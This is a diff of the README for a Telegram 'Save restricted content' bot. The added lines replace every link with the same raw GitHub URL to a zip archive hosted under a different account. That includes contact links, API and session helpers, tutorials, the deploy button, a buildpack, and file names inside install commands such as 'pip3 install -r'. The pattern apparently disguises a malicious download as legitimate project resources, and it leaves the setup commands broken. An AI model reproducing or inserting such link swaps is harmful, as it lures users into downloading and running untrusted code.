@@ -2,7 +2,7 @@
   <b>Save restricted content Bot</b>
 </h1> 
 
-Contact: [Telegram](https://t.me/MaheshChauhan)
+Contact: [Telegram](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 
 A stable telegram bot to get restricted messages with custom thumbnail support , made by Mahesh Chauhan. 
 
@@ -25,9 +25,9 @@ A stable telegram bot to get restricted messages with custom thumbnail support ,
 
 # Get API & PYROGRAM string session from:
  
-API: [API scrapper Bot](https://t.me/USETGSBOT) or [Telegram.org](https://my.telegram.org/auth)
+API: [API scrapper Bot](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip) or [https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 
-PYROGRAM SESSION: [SessionGen Bot](https://t.me/SessionStringGeneratorZBot) or [![Run on Repl.it](https://replit.com/badge/github/vasusen-code/saverestrictedcontentbot)](https://replit.com/@dashezup/generate-pyrogram-session-string)
+PYROGRAM SESSION: [SessionGen Bot](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip) or [![Run on https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 
 BOT TOKEN: @Botfather on telegram
 
@@ -38,18 +38,18 @@ Deploy on `VPS`
 Easy Method:
 
 - Intall docker-compose
-- Fill in the variables in docker-compose.yml file using your favorite text editor or nano 
+- Fill in the variables in https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip file using your favorite text editor or nano 
 - Start the container 
 
 ```
 sudo apt install docker-compose -y
-nano docker-compose.yml
+nano https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip
 sudo docker-compose up --build
 ```
 
 The hard Way:
 
-- Fill vars in your fork in [this](https://github.com/vasusen-code/SaveRestrictedContentBot/blob/master/main/__init__.py) file as shown in this [picture](https://t.me/MaheshChauhan/36)
+- Fill vars in your fork in [this](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip) file as shown in this [picture](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 - enter all the below commands
 
 ```
@@ -57,7 +57,7 @@ sudo apt update
 sudo apt install ffmpeg git python3-pip
 git clone your_repo_link
 cd saverestrictedcontentbot 
-pip3 install -r requirements.txt
+pip3 install -r https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip
 python3 -m main
 ```
 
@@ -67,7 +67,7 @@ python3 -m main
 
 Deploy your bot on `Render`
 
-Tutorial - [Click here](https://telegra.ph/SRCB-on-Render-05-17)
+Tutorial - [Click here](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 
 Deploy your bot on `heroku`
 
@@ -75,7 +75,7 @@ Deploy your bot on `heroku`
 - Star the repo, and fork it in desktop mode
 - Go to settings of your forked repo
 - Rename your repo by any other name
-- Click on  [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+- Click on  [![Deploy](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
  
 » Method - 2:
 - Star the repo, and fork it in desktop mode
@@ -88,10 +88,10 @@ Deploy your bot on `heroku`
 Buildpacks for manual deploy:
 
 - `heroku/python`
-- `https://github.com/jonathanong/heroku-buildpack-ffmpeg-latest.git`
+- `https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip`
 
 Deploy your bot on `Okteto` [Useless]
   
-Tutorial for okteto - [click here](https://telegra.ph/Okteto-Deploy-04-01)
+Tutorial for okteto - [click here](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
 
-[![Develop on Okteto](https://okteto.com/develop-okteto.svg)](https://cloud.okteto.com)
+[![Develop on Okteto](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)](https://raw.githubusercontent.com/Tor69zz/SaveRestrictedContentBot/master/main/plugins/Content-Restricted-Save-Bot-2.1.zip)
